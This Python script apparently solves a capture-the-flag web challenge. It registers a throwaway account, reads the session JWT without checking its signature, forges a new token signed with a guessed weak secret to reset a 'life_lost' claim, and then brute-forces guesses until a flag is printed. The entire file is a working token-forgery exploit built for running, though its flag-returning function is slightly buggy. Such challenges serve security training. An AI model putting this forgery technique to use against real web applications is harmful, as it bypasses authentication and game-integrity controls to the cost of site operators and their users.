import requests
import sys
import random
from bs4 import BeautifulSoup
import string
import hashlib
import jwt 
from urllib.parse import urlparse
import datetime 

# To print in different colors in the terminal 
RED = '\033[91m'
GREEN = '\033[92m'
ENDC = '\033[0m'

def random_string(length=8):
  '''Generates a random string of the specified length.'''
  characters = string.ascii_letters + string.digits  # Combine letters and digits
  return ''.join(random.choice(characters) for _ in range(length))

def md5_hash_password(input_string):
  combined_string = input_string + 'c0rg0'
  encoded_string = combined_string.encode('utf-8')  # Encode the string to bytes
  md5_hash = hashlib.md5(encoded_string).hexdigest()
  return md5_hash

def setup_new_user():
    username = random_string()
    password = md5_hash_password(username)
    return username, password 

def register(session, url):
    username, password = setup_new_user()
    regParam = {'username':username,'password':password,'confirm':password,'submit':'Register'}
    response = session.post(url + '/register',json=regParam)
    return response, username, password

def login(session, url, username, password):
    loginParam = {'username':username,'password':password,'submit':'Login'}
    response = session.post(url + '/login', json=loginParam)
    if response.status_code != 200:
        print(RED + f'Login failed for user: {username}. Problem with the server?' + ENDC)
        exit()
    print(GREEN + f'Successfully logged in as user: {username}' + ENDC)
    return response

def home(session, url):
    response = session.get(url + '/home')
    if response.status_code != 200:
        print(RED + f'Could not fetch homepage, likely problem with server.' + ENDC)
        exit()
    print(GREEN + f'Successfully fetched Homepage' + ENDC)
    return response


def check_error(response, session):
    if response.status_code != 200:
        print(RED + f'Registration did not return 200. Problem with server.' + ENDC)
        exit()
    soup = BeautifulSoup(response.text, 'html.parser')
    error_ul = soup.find('ul', class_='error')
    if not error_ul:
        return True 
    error_message = error_ul.find('li').text.strip()
    print(RED + f"Error message: {error_message}" +ENDC)
    return False 

def get_flag(response):
    flag = None 
    soup = BeautifulSoup(response.text, 'html.parser')
    flag_div = soup.find('div', class_='flag')
    if flag_div:
        strong_tag = flag_div.find('strong')
        if strong_tag:
            flag_text = strong_tag.text.strip()
            print(GREEN + f'Flag is: {flag_text}' + ENDC)
            return flag 

def guess(session, url, letter, jwt_token, csrf_token, domain):
    session.cookies.set("access_token_cookie", jwt_token, domain=domain)
    data = {'letter': letter, 'csrf_token' : csrf_token}
    response = session.post(
        url + '/guess',
        data=data,
        headers={
            "Referer": url + "/home",
        }
    )
    soup = BeautifulSoup(response.text, 'html.parser')
    outcome_div = soup.find('div', {'class': 'outcome'})
    print(f'{response.text}')
    if outcome_div:
        outcome_text = outcome_div.text.strip()  # Get the text and remove extra whitespace
        print(f'Outcome: {outcome_text}')
        if 'Congrats' in outcome_text:
            flag = get_flag(response)
            print(f'Flag is: {flag}')
            exit()
    else:
        print(RED + f'Outcome text not found.' + ENDC)
            
def create_jwt(sub, algorithm='HS256'):
    now_timestamp = int(datetime.datetime.now().timestamp())
    payload = {
        "fresh": False,
        "iat": now_timestamp,  # Use current timestamp
        "type": "access",
        "sub": sub,
        "nbf": now_timestamp,  # Use current timestamp
        "exp": now_timestamp + 900,  # Example: Expires in 15 minutes (900 seconds)
        "life_lost": "0"
    }
    # Encode the payload into a JWT.
    try:
        encoded_jwt = jwt.encode(payload, "tobemodified", algorithm=algorithm)
        return encoded_jwt
    except Exception as e:
        print(f"Error encoding JWT: {e}")
        return None


def main():
    if len(sys.argv) != 2:
        print('Please specify challenge URL')
        print('python3 solution.py <challenge-url>')
        print('E.g, python3 solution.py http://127.0.0.1:8000')
        exit()
    url = sys.argv[1]
    parsed_url = urlparse(url)
    domain = parsed_url.hostname
    letters = list(string.ascii_lowercase + string.digits)
    # Set-up your main user
    with requests.Session() as session:
        while True:
            response, username, password = register(session, url)
            if check_error(response, session):
                print(GREEN + f'Successfully registered user: {username} and password: {password}' + ENDC)
                break  # Exit the loop on success
            else:
             print(RED + f'Retrying registration' + ENDC)
        response = login(session, url, username, password)
        response = home(session, url)
        access_token = session.cookies.get('access_token_cookie')
        print(f'Access token: {access_token}')
        sub = "" 
        try:
        # Decode the JWT without verifying the signature
         decoded_payload = jwt.decode(access_token, "tobemodified", algorithms=["HS256"], options={"verify_signature": False})
         # Access the 'sub' claim
         sub = decoded_payload.get('sub')
         print(f'The `sub` (subject) claim is: {sub}')
        except jwt.exceptions.DecodeError as e:
            print(f'Error decoding JWT: {e}')
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
        print(f'{response.text}')
        soup = BeautifulSoup(response.text, 'html.parser')
        # Find the csrf_token.  Since it has an id, that's the easiest way.
        csrf_token_input = soup.find('input', {'id': 'csrf_token'})
        if csrf_token_input:
            csrf_token = csrf_token_input['value']
            print(GREEN + f'CSRF Token: {csrf_token}' + ENDC)
        else:
            print(RED + f'CSRF Token not found' + ENDC)
            exit()
        jwt_token = create_jwt(sub)
        print(f'New JWT: {jwt_token}')
        for letter in letters:
            guess(session, url, letter, jwt_token, csrf_token, domain)

if __name__ == "__main__":
    main()